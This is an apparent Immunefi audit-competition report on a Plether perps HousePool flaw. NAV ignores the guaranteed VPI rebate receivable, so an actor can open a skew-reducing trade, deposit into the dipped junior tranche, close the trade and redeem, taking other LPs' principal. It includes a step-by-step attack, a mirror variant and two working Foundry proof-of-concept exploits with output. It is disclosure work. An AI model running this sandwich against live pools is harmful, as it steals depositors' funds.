# \#99003 [SC-Critical] LP NAV omits the guaranteed VPI rebate receivable, letting a timed deposit mint excess tranche shares and withdraw other LPs' deposited principal

**Submitted on Nov 11th 2026 at 11:57:00 UTC by @OadeHack for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99003
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

The HousePool prices every tranche deposit and redemption from a single canonical net-asset value built in [`HousePoolAccountingLib.buildReconcileSnapshot`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78). That NAV is built from exactly three inputs — physical pool cash (`physicalAssets`), the terminal price-PnL delta (`terminalLpPriceDeltaAssets`), and outstanding trader claims (`traderClaimBalanceAssets`). It does **not** include the VPI rebate reserve.

The VPI rebate reserve is settlement token the pool has already paid out to a trader but is contractually guaranteed to reclaim when that trader's position closes. A skew-reducing open pays a rebate out of pool cash — lowering NAV immediately — while the offsetting receivable that will restore that cash is invisible to the NAV calculation. Because the close-side [lifetime-VPI clamp](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L118) *guarantees* the rebate is reclaimed, the NAV dip is a temporary, guaranteed-to-reverse depression — the ideal condition for a share-price sandwich.

A single actor who controls a trading position and a junior LP position can therefore:

1. Reduce an existing one-sided book by opening the opposite side. The engine pays the VPI rebate out of pool cash, so NAV drops by the rebate amount.
2. Deposit into the junior tranche. The asynchronous deposit settles at the depressed NAV and mints excess shares.
3. Close the position. The clamp returns the rebate to the pool, NAV recovers, and the attacker's excess shares are now redeemable for more than was deposited — the difference coming out of the LPs who held through the dip.

Measured end to end on the real `OrderRouter` / `HousePool` / `TrancheVault` stack at the deployed parameters (`vpiFactorWad = 1e16`, `maxSkewRatioWad = 4e17`, `executionFeeBps = 4`), against a matched control that removes only the manipulation trade, a passive honest LP **withdraws less than the principal it deposited**, while the same LP in the control withdraws more than its principal. The shortfall is the honest LP's own at-rest capital, taken by the attacker. This is direct theft of user funds, not of unclaimed yield.

## Details

### The canonical NAV and what it leaves out

[`buildReconcileSnapshot`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78) computes distributable LP equity as:

```
terminalAssets      = physicalAssets + max(terminalLpPriceDelta, 0)
terminalLiabilities = traderClaims    + max(-terminalLpPriceDelta, 0)
distributable       = terminalAssets - terminalLiabilities   (floored at 0)
```

`physicalAssets` is [`HousePool.totalAssets()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L426-L429), `terminalLpPriceDelta` is the capped price-PnL curve, and `traderClaims` is the trader claim liability; the engine assembles these in [`getHousePoolInputSnapshot`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineProtocolLens.sol#L59). **The VPI rebate reserve appears in none of the three terms**, yet it is a known, deterministic claim the pool holds against the trader, readable at [`vpiRebateReserveAssets`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L558).

Both tranche deposit pricing and redemption pricing derive from this same NAV, so any temporary distortion of `physicalAssets` that is not reflected in a NAV term mis-prices LP entry and exit one-for-one.

### VPI moves physical cash in a way NAV cannot see

On a skew-**reducing** open the trade cost is negative — a rebate. The planner records it in [`CfdEnginePlanLib`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L333):

```solidity
delta.poolRebatePayoutAssets = openState.tradeCostAssets < 0 ? uint256(-openState.tradeCostAssets) : 0;
```

and the settlement sidecar pays it out of the pool on execution in [`CfdEngineSettlementSidecar`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L442-L443):

```solidity
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
}
```

[`HousePool.payOut`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L604-L613) does `accountedAssets -= amount` and transfers the token out, so [`totalAssets()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L426-L429) — `min(raw, accountedAssets)` — and therefore NAV drop by the rebate immediately.

The same open locks that exact amount into the trader's dedicated negative-VPI reserve in [`CfdEngineSettlementSidecar`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L466-L478). It is not a gift: the [lifetime-VPI clamp](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L118) guarantees the pool takes it back at close:

```solidity
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

This clamp is the key. Its own comment shows the design already anticipates VPI-based "LP sandwich attacks" and defends against the variant where the attacker tries to *keep* a net-negative rebate. But by forcing lifetime VPI non-negative it **guarantees** the rebate paid on the opening leg is fully reclaimed on the closing leg and returned to pool cash, lifting NAV back up. The rebate is therefore a **temporary NAV depression fully backed by a guaranteed receivable that NAV ignores** — the clamp closes the "keep the rebate" sandwich while leaving the "mint shares into the guaranteed-reversible dip" sandwich wide open, because [`buildReconcileSnapshot`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78) never counts the receivable the clamp guarantees.

### The attack

A single actor funds a trading account and a junior LP position.

1. **Create the dip.** Against a pre-existing one-sided (LONG) book, open the opposing (SHORT) side, reducing skew toward zero. The engine pays the VPI rebate from pool cash; junior NAV drops by the rebate.
2. **Deposit into the dip.** Request a junior deposit. The asynchronous deposit settles at the next LP epoch while the position is still open and NAV is depressed, minting more shares than the deposit's fair value.
3. **Restore NAV.** Close the position. The clamp returns the rebate to the pool; NAV recovers. The attacker's shares are now redeemable for more than deposited.
4. **Realize.** After the deposit cooldown, redeem the shares. The redemption prices off the recovered NAV and pays out real tokens, drawn from the LPs who held junior shares across the dip.

### Redemption-side mirror (no counterparty required)

The deposit-side variant needs a pre-existing one-sided book. The mirror does not: open a skew-**increasing** position, which books a VPI **charge** as immediate LP revenue and lifts NAV; redeem junior shares at the inflated NAV; then close, which returns the charge to the trader and drops NAV, diluting the LPs who remain. Here the attacker creates the skew themselves, bounded only by `maxSkewRatio`. The deposit-side PoC below is the conservative demonstration; the mirror widens applicability.

## Impact

**Severity: Critical — Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.**

The proof-of-concept measures a passive honest LP that deposits exactly `1,000,000` USDG and never trades. Across an identical attack run and control run (same LP entries and exits, same oracle price, same epochs; the *only* difference is the attacker's open/close), measured in settlement tokens actually withdrawn to the LP's wallet:

| Cycles | Honest LP withdrawn (attack) | Honest LP withdrawn (control) | Honest LP vs **deposited principal** | Attacker net vs control |
|---|---|---|---|---|
| 1 | 999,577.72 | 1,000,153.33 | **−422.28** | +271.57 |
| 2 | 999,002.99 | 1,000,154.30 | **−997.01** | +543.54 |
| 4 | 997,852.56 | 1,000,156.24 | **−2,147.44** | +1,088.67 |

In the control the honest LP always ends **at or above** the principal it contributed (it earns ordinary LP yield). Under attack it ends **below** that principal — it cannot withdraw the capital it deposited. The amount below principal is, by definition, not unclaimed yield; it is the LP's deposited funds. The effect is permissionless, repeatable every LP epoch, and scales with the number of cycles, the pool size, the skew, the VPI factor, and the attacker's share of the tranche.

**Where the value goes (conservation).** Token supply is asserted constant across the branch point, so the flows net to zero. For one cycle: the honest LP loses `575.6` USDG versus the control; that full amount accrues to the attacker's LP account via the mispriced shares. The attacker separately spends `304.74` USDG of its own trading margin on the two execution fees (which is the `+304` treasury delta), netting `+271.57`. The attacker profits after all costs, and the honest LP's loss includes `422.28` of its own principal. This is a transfer of deposited funds from honest LPs to the attacker, not a redistribution of fees or yield.

Two honest limiters, stated plainly:
- The deposit-side variant requires a pre-existing one-sided book near the skew cap to rebate against. The redemption-side mirror (below) removes this precondition.
- To capture most of the dip the attacker needs a dominant junior tranche share (the PoC uses ~80%: a 4,000,000 USDG deposit against a 1,000,000 USDG honest LP), and holds the position across the ~1-hour deposit epoch, bearing its price risk during the hold; the PoC demonstrates the accounting flaw at a static mark.

Neither limiter changes the impact *type*: wherever the profit condition `vpiFactor × skewRatio × attackerLPShare > 4 × executionFeeBps` holds, the honest LP's withdrawable principal is reduced. They bound how often and how cheaply the theft can be run, not whether it reaches principal.

## Recommendation

Make the NAV reflect the guaranteed VPI clawback. Any of the following closes it:

- Include the aggregate VPI rebate reserve as a pool **receivable** in [`buildReconcileSnapshot`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78), so the temporary cash outflow of a rebate is offset by the claim the pool holds and NAV does not move when a rebate is paid.
- Equivalently, on a rebate-paying open, book the payout against a pool receivable rather than against `accountedAssets`, so [`totalAssets()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L426-L429) is unchanged until the position actually closes.
- Or gate tranche deposit/redemption pricing on VPI being settled (exclude unsettled rebate flows from the epoch's NAV), so entry and exit cannot be timed against an in-flight rebate.

The invariant to restore: LP entry/exit NAV must not change in response to a cash movement that is contractually guaranteed to reverse. This is the same invariant the [lifetime-VPI clamp](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L118) already protects on the trader side; it must also hold on the LP-pricing side.

## Proof of Concept

## Proof of Concept

Two Foundry tests on the real router/engine/pool/vault stack, using only the public `OrderRouter` and the public asynchronous LP lifecycle, at the deployed parameters (`vpiFactor 0.01`, `maxSkewRatio 0.4`, `executionFeeBps 4`). Place both in `test/perps/spec/policy/`.

### PoC 1 — Matched-control principal theft (headline)

A passive honest LP deposits `1,000,000` USDG and never trades. The test runs an attack branch and an identical control branch from one snapshot, differing only in the attacker's open/close. It measures external settlement tokens withdrawn and asserts the Critical-principal gate: the control LP ends **≥** its contributed principal while the attack LP ends **<** its contributed principal. The keeper is a separate account whose bounties are withdrawn separately and excluded from attacker profit; token supply is asserted constant across the branch point.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {OracleSynchronizationTestBase} from "../../shared/OracleSynchronizationTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console} from "forge-std/console.sol";

contract VpiNavPrincipalTransferE2E is OracleSynchronizationTestBase {
    address internal constant HONEST_LP = address(0x510001);
    address internal constant VICTIM_TRADER = address(0x510002);
    address internal constant ATTACKER_LP = address(0x510003);
    address internal constant ATTACKER_TRADER = address(0x510004);
    address internal constant INDEPENDENT_KEEPER = address(0x510005);

    uint256 internal constant PRICE = 1e8;
    uint256 internal constant SKEW_SIZE = 3800e20; // 3,800 lots, 380k USDG notional
    uint256 internal constant HONEST_PRINCIPAL = 1_000_000e6;
    uint256 internal constant ATTACKER_LP_PRINCIPAL = 4_000_000e6;
    uint256 internal constant ATTACKER_TRADER_PRINCIPAL = 50_000e6;
    uint256 internal constant VICTIM_TRADER_PRINCIPAL = 60_000e6;
    // Idle recycling buffer. Covers per-round-trip dust across many cycles.
    // Minted before the branch point; identical in both branches; nets out.
    uint256 internal constant ATTACKER_LP_BUFFER = 1_000e6;

    struct Outcome {
        uint256 honestWallet;
        uint256 attackerLpWallet;
        uint256 attackerTraderWallet;
        uint256 victimTraderWallet;
        uint256 keeperWallet;
        uint256 treasuryClaim;
        uint256 poolCash;
        uint256 clearinghouseCash;
        uint256 tokenSupply;
        uint256 honestShares;
        uint256 attackerShares;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory p) {
        p = super._riskParams();
        p.vpiFactor = 1e16;      // deployed: 1%
        p.maxSkewRatio = 4e17; // deployed: 40%
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0; // A real, independently funded HONEST_LP is deposited through the public vault below.
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _signedPayload() internal view returns (bytes[] memory data) {
        uint64 tick = uint64(block.timestamp);
        data = _payload(tick, tick - 1);
        MockPyth.FeedUpdate[] memory feeds = abi.decode(data[0], (MockPyth.FeedUpdate[]));
        for (uint256 i; i < feeds.length; ++i) {
            feeds[i].price.conf = 0; // isolate VPI and fee economics, not adverse-confidence pricing
        }
        data[0] = abi.encode(feeds);
    }

    function _refreshMarkViaRouter() internal {
        bytes[] memory liveData = _signedPayload();
        vm.prank(INDEPENDENT_KEEPER);
        router.updateMarkPrice{value: FEE}(liveData);
        assertEq(engine.lastMarkPrice(), PRICE, "live oracle did not install a valid Engine mark");
        assertEq(engine.lastMarkTime(), block.timestamp, "Engine mark is not current");
    }

    function _historicalPayload(uint64 commitTime) internal pure returns (bytes[] memory data) {
        data = _payload(commitTime + 1, commitTime);
        MockPyth.FeedUpdate[] memory feeds = abi.decode(data[0], (MockPyth.FeedUpdate[]));
        for (uint256 i; i < feeds.length; ++i) {
            feeds[i].price.conf = 0;
        }
        data[0] = abi.encode(feeds);
    }

    function _publicTrade(address trader, CfdTypes.Side side, uint256 margin, bool close_) internal {
        _refreshMarkViaRouter();
        uint64 commitTime = uint64(block.timestamp);
        vm.prank(trader);
        uint64 id = router.commitOrder(side, SKEW_SIZE, margin, 0, close_);
        vm.warp(block.timestamp + 2);
        vm.roll(block.number + 1);
        bytes[] memory priceData = _historicalPayload(commitTime);
        vm.prank(INDEPENDENT_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder{value: 2 * FEE}(id, priceData);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "public trade failed");
        (uint256 size,,,,,,) = engine.positions(trader);
        assertEq(size, close_ ? 0 : SKEW_SIZE, "unexpected position size");
    }

    function _publicSettleEpoch() internal {
        if (engine.terminalNavSnapshot().hasOpenPositions && !engine.isOracleFrozen()) {
            bytes[] memory priceData = _signedPayload();
            vm.prank(INDEPENDENT_KEEPER);
            router.settleLpEpoch{value: FEE}(priceData);
        } else {
            vm.prank(INDEPENDENT_KEEPER);
            pool.settleLpEpoch(0, 0);
        }
    }

    function _requestDeposit(address lp, uint256 amount) internal returns (uint256 id) {
        vm.prank(lp);
        id = juniorVault.requestDeposit(amount, lp, lp);
    }

    function _activateDeposit(address lp, uint256 id, uint256 amount) internal returns (uint256 shares) {
        uint256 maturity = pool.lpEpochStart(id);
        if (block.timestamp < maturity) vm.warp(maturity);
        _publicSettleEpoch();
        uint256 claim = juniorVault.claimableDepositRequest(id, lp);
        assertEq(claim, amount, "deposit did not activate in full");
        vm.prank(lp);
        shares = juniorVault.claimDeposit(id, claim, lp, lp);
        assertGt(shares, 0, "zero minted LP shares");
    }

    function _redeemAll(address lp) internal returns (uint256 externalAssets) {
        uint256 unlock = juniorVault.lastDepositTime(lp) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < unlock) vm.warp(unlock);
        uint256 shares = juniorVault.balanceOf(lp);
        assertGt(shares, 0, "no shares to redeem");
        assertEq(juniorVault.maxRequestRedeem(lp), shares, "not all shares unlocked");
        vm.prank(lp);
        uint256 id = juniorVault.requestRedeem(shares, lp, lp);
        uint256 maturity = pool.lpEpochStart(id);
        if (block.timestamp < maturity) vm.warp(maturity);
        _publicSettleEpoch();
        uint256 fundedShares = juniorVault.claimableRedeemRequest(id, lp);
        uint256 fundedAssets = juniorVault.claimableRedeemAssets(id, lp);
        assertEq(fundedShares, shares, "partial funding: cannot claim full actual LP proceeds");
        assertGt(fundedAssets, 0, "zero funded redemption");
        uint256 beforeWallet = settlementToken.balanceOf(lp);
        vm.prank(lp);
        uint256 claimed = juniorVault.claimRedeem(id, fundedShares, lp, lp);
        assertEq(claimed, fundedAssets, "claim amount inconsistent");
        externalAssets = settlementToken.balanceOf(lp) - beforeWallet;
        assertEq(externalAssets, claimed, "actual external token transfer missing");
        assertEq(juniorVault.balanceOf(lp), 0, "unredeemed LP shares remain");
        assertEq(juniorVault.pendingRedeemRequest(id, lp), 0, "unfinished redemption claim");
    }

    function _withdrawAllTrader(address trader) internal {
        uint256 amount = clearinghouse.balanceAssets(trader);
        assertGt(amount, 0, "trader has nothing to withdraw");
        vm.prank(trader);
        clearinghouse.withdraw(trader, amount);
        assertEq(clearinghouse.balanceAssets(trader), 0, "trader settlement claim remains");
    }

    function _prepareCommonState() internal {
        vm.deal(INDEPENDENT_KEEPER, 10 ether);
        _fundTrader(VICTIM_TRADER, VICTIM_TRADER_PRINCIPAL);
        _fundTrader(ATTACKER_TRADER, ATTACKER_TRADER_PRINCIPAL);
        settlementToken.mint(HONEST_LP, HONEST_PRINCIPAL);
        // Pre-branch idle buffer (minted before the snapshot and before startingSupply
        // is captured, so the supply-constant guard holds and it cancels in attack-minus-control).
        settlementToken.mint(ATTACKER_LP, ATTACKER_LP_PRINCIPAL + ATTACKER_LP_BUFFER);
        vm.prank(HONEST_LP);
        settlementToken.approve(address(juniorVault), type(uint256).max);
        vm.prank(ATTACKER_LP);
        settlementToken.approve(address(juniorVault), type(uint256).max);

        uint256 honestId = _requestDeposit(HONEST_LP, HONEST_PRINCIPAL);
        _activateDeposit(HONEST_LP, honestId, HONEST_PRINCIPAL);
        _publicTrade(VICTIM_TRADER, CfdTypes.Side.LONG, 30_000e6, false);
        assertEq(settlementToken.balanceOf(HONEST_LP), 0, "honest principal not deposited");
    }

    function _run(bool manipulate, uint256 cycles) internal returns (Outcome memory o) {
        for (uint256 i; i < cycles; ++i) {
            if (manipulate) {
                _publicTrade(ATTACKER_TRADER, CfdTypes.Side.SHORT, 20_000e6, false);
                assertGt(clearinghouse.vpiRebateReserveAssets(ATTACKER_TRADER), 0, "no real rebate reserve");
            } else {
                vm.warp(block.timestamp + 2);
                vm.roll(block.number + 1);
            }
            uint256 id = _requestDeposit(ATTACKER_LP, ATTACKER_LP_PRINCIPAL);
            _activateDeposit(ATTACKER_LP, id, ATTACKER_LP_PRINCIPAL);
            if (manipulate) {
                _publicTrade(ATTACKER_TRADER, CfdTypes.Side.SHORT, 0, true);
                assertEq(clearinghouse.vpiRebateReserveAssets(ATTACKER_TRADER), 0, "rebate obligation left open");
            } else {
                vm.warp(block.timestamp + 2);
                vm.roll(block.number + 1);
            }
            _redeemAll(ATTACKER_LP);
        }

        _publicTrade(VICTIM_TRADER, CfdTypes.Side.LONG, 0, true);
        _redeemAll(HONEST_LP);
        _withdrawAllTrader(ATTACKER_TRADER);
        _withdrawAllTrader(VICTIM_TRADER);

        uint256 keeperCredit = clearinghouse.balanceAssets(INDEPENDENT_KEEPER);
        if (keeperCredit != 0) {
            vm.prank(INDEPENDENT_KEEPER);
            clearinghouse.withdraw(INDEPENDENT_KEEPER, keeperCredit);
        }
        o.honestWallet = settlementToken.balanceOf(HONEST_LP);
        o.attackerLpWallet = settlementToken.balanceOf(ATTACKER_LP);
        o.attackerTraderWallet = settlementToken.balanceOf(ATTACKER_TRADER);
        o.victimTraderWallet = settlementToken.balanceOf(VICTIM_TRADER);
        o.keeperWallet = settlementToken.balanceOf(INDEPENDENT_KEEPER);
        o.treasuryClaim = clearinghouse.balanceAssets(engine.protocolTreasury());
        o.poolCash = settlementToken.balanceOf(address(pool));
        o.clearinghouseCash = settlementToken.balanceOf(address(clearinghouse));
        o.tokenSupply = settlementToken.totalSupply();
        o.honestShares = juniorVault.balanceOf(HONEST_LP);
        o.attackerShares = juniorVault.balanceOf(ATTACKER_LP);
        assertEq(o.honestShares, 0, "honest LP share balance not fully liquidated");
        assertEq(o.attackerShares, 0, "attacker LP share balance not fully liquidated");
    }

    function _signedDifference(uint256 a, uint256 b) internal pure returns (int256) {
        return int256(a) - int256(b);
    }

    function _compare(uint256 cycles, bool requirePrincipalLoss) internal {
        _prepareCommonState();
        uint256 startingSupply = settlementToken.totalSupply();
        uint256 branch = vm.snapshotState();
        Outcome memory attack = _run(true, cycles);
        assertTrue(vm.revertToState(branch), "failed to rewind to identical market snapshot");
        Outcome memory control = _run(false, cycles);

        assertEq(attack.tokenSupply, startingSupply, "attack branch minted tokens after branch point");
        assertEq(control.tokenSupply, startingSupply, "control branch minted tokens after branch point");

        uint256 attackerAttackAssets = attack.attackerLpWallet + attack.attackerTraderWallet;
        uint256 attackerControlAssets = control.attackerLpWallet + control.attackerTraderWallet;
        int256 extraAttackerValue = _signedDifference(attackerAttackAssets, attackerControlAssets);
        int256 honestLossVsControl = _signedDifference(control.honestWallet, attack.honestWallet);
        int256 honestPrincipalChange = _signedDifference(attack.honestWallet, HONEST_PRINCIPAL);

        console.log("cycles", cycles);
        console.log("attacker final external USDG (attack)", attackerAttackAssets);
        console.log("attacker final external USDG (control)", attackerControlAssets);
        console.log("honest final external USDG (attack)", attack.honestWallet);
        console.log("honest final external USDG (control)", control.honestWallet);
        console.log("honest initially contributed principal", HONEST_PRINCIPAL);
        console.log("extra attacker USDG vs matched control (signed):");
        console.logInt(extraAttackerValue);
        console.log("honest LP loss vs matched control (signed):");
        console.logInt(honestLossVsControl);
        console.log("honest LP final PnL vs contributed principal (signed):");
        console.logInt(honestPrincipalChange);

        assertGt(extraAttackerValue, 0, "no excess attacker value; profitability NOT proved");
        assertGt(honestLossVsControl, 0, "honest LP did not lose value vs control");

        if (requirePrincipalLoss) {
            assertGe(control.honestWallet, HONEST_PRINCIPAL, "baseline already lost principal; no attribution");
            assertLt(attack.honestWallet, HONEST_PRINCIPAL, "CRITICAL_PRINCIPAL_NOT_PROVED: only yield diluted");
        }
    }

    function test_VPI_OneCycle_PublicRoutesAndRealizedValueTransfer() public { _compare(1, false); }
    function test_VPI_OneCycle_CriticalPrincipalGate() public { _compare(1, true); }
    function test_VPI_TwoCycles_CriticalPrincipalGate() public { _compare(2, true); }
    function test_VPI_FourCycles_CriticalPrincipalGate() public { _compare(4, true); }
}
```

Observed output (all four pass):

```
[PASS] test_VPI_OneCycle_CriticalPrincipalGate()
  honest final external USDG (attack)   999577719282
  honest final external USDG (control)  1000153326939
  honest initially contributed principal 1000000000000
  extra attacker USDG vs matched control (signed):  271569793
  honest LP loss vs matched control (signed):       575607657
  honest LP final PnL vs contributed principal (signed): -422280718

[PASS] test_VPI_TwoCycles_CriticalPrincipalGate()
  honest final external USDG (attack)   999002993616
  honest final external USDG (control)  1000154297474
  honest LP final PnL vs contributed principal (signed): -997006384

[PASS] test_VPI_FourCycles_CriticalPrincipalGate()
  honest final external USDG (attack)   997852559341
  honest final external USDG (control)  1000156238545
  honest LP final PnL vs contributed principal (signed): -2147440659

Suite result: ok. 4 passed; 0 failed; 0 skipped
```

The `CriticalPrincipalGate` assertion — control LP `≥` contributed principal **and** attack LP `<` contributed principal — holds at 1, 2, and 4 cycles. The honest LP cannot withdraw the capital it deposited; the shortfall grows with each cycle.

### PoC 2 — Single-actor realized profit and per-leg attribution (corroboration)

This test isolates the attacker's own economics, redeeming all LP shares to tokens and reading the withdrawable trading balance, to show the profit is realized (not marked) and to separate the LP leg from the trade leg.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {console} from "forge-std/console.sol";

contract VpiNavRealizedProbeTest is BasePerpTest {
    address internal constant VICTIM_TRADER = address(0xA11CE);
    address internal constant ATK_TRADER = address(0xBADA);
    address internal constant ATK_LP = address(0xBADB);

    uint256 internal constant SKEW_SIZE = 3800e20;
    uint256 internal constant LP_DEPOSIT = 4_000_000e6;
    uint256 internal constant TRADER_FUND = 50_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory p) {
        p = super._riskParams();
        p.vpiFactor = 0.01e18;
        p.maxSkewRatio = 0.4e18;
    }

    function _refreshMark() internal {
        uint256 m = engine.lastMarkPrice();
        vm.prank(address(router));
        engine.updateMarkPrice(m == 0 ? 1e8 : m, SafeCast.toUint64(block.timestamp));
    }

    function _redeemAllJunior(address lp) internal returns (uint256 proceeds, uint256 leftoverShares) {
        vm.warp(block.timestamp + 1 hours + 1);
        _refreshMark();
        uint256 shares = juniorVault.balanceOf(lp);
        uint256 maxShares = juniorVault.maxRequestRedeem(lp);
        uint256 reqShares = shares < maxShares ? shares : maxShares;
        require(reqShares > 0, "no redeemable shares");
        vm.prank(lp);
        uint256 rid = juniorVault.requestRedeem(reqShares, lp, lp);
        uint256 activationTime = pool.lpEpochStart(rid);
        if (block.timestamp < activationTime) vm.warp(activationTime);
        _refreshMark();
        _settleLpEpochForTest();
        vm.prank(lp);
        proceeds = juniorVault.claimRedeem(rid, reqShares, lp, lp);
        leftoverShares = juniorVault.balanceOf(lp);
    }

    function _run(bool attack) internal {
        _fundTrader(VICTIM_TRADER, 60_000e6);
        _open(VICTIM_TRADER, CfdTypes.Side.LONG, SKEW_SIZE, 30_000e6, 1e8);
        _fundTrader(ATK_TRADER, TRADER_FUND);
        if (attack) {
            _open(ATK_TRADER, CfdTypes.Side.SHORT, SKEW_SIZE, 20_000e6, 1e8);
        }
        _fundJuniorDelayed(ATK_LP, LP_DEPOSIT);
        if (attack) {
            _close(ATK_TRADER, CfdTypes.Side.SHORT, SKEW_SIZE, 1e8);
        }
        (uint256 lpProceeds, uint256 leftover) = _redeemAllJunior(ATK_LP);
        uint256 tradeBalance = clearinghouse.balanceAssets(ATK_TRADER);
        int256 lpNet = int256(lpProceeds) - int256(LP_DEPOSIT);
        int256 tradeNet = int256(tradeBalance) - int256(TRADER_FUND);
        console.log("leftover junior shares (unrealized)", leftover);
        console.log("LP net / trade net / REALIZED NET PROFIT:");
        console.logInt(lpNet);
        console.logInt(tradeNet);
        console.logInt(lpNet + tradeNet);
    }

    function test_realized_attack() public { _run(true); }
    function test_realized_control() public { _run(false); }
}
```

Observed output:

```
[PASS] test_realized_attack()
  attacker VPI reserve (locked rebate) 720041085
  LP proceeds         4000576494646  in: 4000000000000   -> LP net   +576,494,646
  Trade balance left  49695260316    in: 50000000000     -> trade net -304,739,684
  leftover junior shares (unrealized) 0
  REALIZED NET PROFIT: 271754962   (+271.75 USDG)

[PASS] test_realized_control()
  LP proceeds         3999999985393  in: 4000000000000
  REALIZED NET PROFIT: -14607       (-0.0000146 USDG, rounding dust)
```

The attacker redeems to zero shares and ends `+271.75` USDG over total capital deployed; the control nets dust. The `720.04` locked VPI reserve is exactly the NAV dip the deposit was priced into — the LP leg gains `+576.49` (drawn from other junior LPs), the trade leg costs `−304.74` (the two execution fees), confirming the conservation breakdown in the Impact section.
